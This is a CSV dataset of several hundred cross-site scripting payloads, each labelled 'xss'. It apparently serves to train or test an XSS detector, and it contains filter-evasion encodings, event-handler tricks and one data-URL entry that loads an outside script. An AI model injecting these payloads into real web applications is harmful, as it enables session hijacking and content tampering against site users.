payload,label
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
<script>+-+-1-+-+alert(1)</script>,xss
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
<img src ?itworksonchrome?\/onerror = alert(1),xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
<svg><script onlypossibleinopera:-)> alert(1),xss
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
<script x> alert(1) </script 1=2,xss
"<div/onmouseover='alert(1)'> style=""x:"">",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
"'`""><\x00script>javascript:alert(1)</script>",xss
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",xss
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",xss
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",xss
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",xss
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",xss
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",xss
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",xss
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",xss
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",xss
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",xss
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",xss
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",xss
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss
\x3Cscript>javascript:alert(1)</script>,xss
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
<script>javascript:alert(1)</script\x0D,xss
<script>javascript:alert(1)</script\x0A,xss
<script>javascript:alert(1)</script\x0B,xss
"<script charset=""\x22>javascript:alert(1)</script>",xss
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<script>/* *\x2A/javascript:alert(1)// */</script>,xss
<script>/* *\x00/javascript:alert(1)// */</script>,xss
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF",xss
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF",xss
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",xss
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",xss
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
"'`""><\x00script>javascript:alert(1)</script>",xss
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",xss
"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",xss
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",xss
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss
"""`'><script>\x3Bjavascript:alert(1)</script>",xss
"""`'><script>\x0Djavascript:alert(1)</script>",xss
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss
"""`'><script>\x09javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
"""`'><script>\x00javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",xss
"""`'><script>\x0Cjavascript:alert(1)</script>",xss
"""`'><script>\x2Bjavascript:alert(1)</script>",xss
"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
"""`'><script>-javascript:alert(1)</script>",xss
"""`'><script>\x0Ajavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
"""`'><script>\x7Ejavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
"""`'><script>\xC2\x85javascript:alert(1)</script>",xss
"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
"""`'><script>\x21javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss
"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss
"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",xss
"""`'><script>\x0Bjavascript:alert(1)</script>",xss
"""`'><script>\x20javascript:alert(1)</script>",xss
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
<script\x2F>javascript:alert(1)</script>,xss
<script\x20>javascript:alert(1)</script>,xss
<script\x0D>javascript:alert(1)</script>,xss
<script\x0A>javascript:alert(1)</script>,xss
<script\x0C>javascript:alert(1)</script>,xss
<script\x00>javascript:alert(1)</script>,xss
<script\x09>javascript:alert(1)</script>,xss
"""><img src=x onerror=javascript:alert(1)>",xss
"""><img src=x onerror=javascript:alert('1')>",xss
"""><img src=x onerror=javascript:alert(""1"")>",xss
"""><img src=x onerror=javascript:alert(`1`)>",xss
"""><img src=x onerror=javascript:alert(('1'))>",xss
"""><img src=x onerror=javascript:alert((""1""))>",xss
"""><img src=x onerror=javascript:alert((`1`))>",xss
"""><img src=x onerror=javascript:alert(A)>",xss
"""><img src=x onerror=javascript:alert((A))>",xss
"""><img src=x onerror=javascript:alert(('A'))>",xss
"""><img src=x onerror=javascript:alert('A')>",xss
"""><img src=x onerror=javascript:alert((""A""))>",xss
"""><img src=x onerror=javascript:alert(""A"")>",xss
"""><img src=x onerror=javascript:alert((`A`))>",xss
"""><img src=x onerror=javascript:alert(`A`)>",xss
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
<script>javascript:alert(1)<\x00/script>,xss
"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
<input onfocus=javascript:alert(1) autofocus>,xss
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
<video poster=javascript:javascript:alert(1)//,xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
"<video onerror=""javascript:javascript:alert(1)""><source>",xss
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
<body oninput=javascript:alert(1)><input autofocus>,xss
"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
<frameset onload=javascript:alert(1)>,xss
"<table background=""javascript:javascript:alert(1)"">",xss
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
"<object data=""data:text/html;base64,%(base64)s"">",xss
"<embed src=""data:text/html;base64,%(base64)s"">",xss
<b <script>alert(1)</script>0,xss
"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
"<embed src=""javascript:alert(1)"">",xss
"<img src=""javascript:alert(1)"">",xss
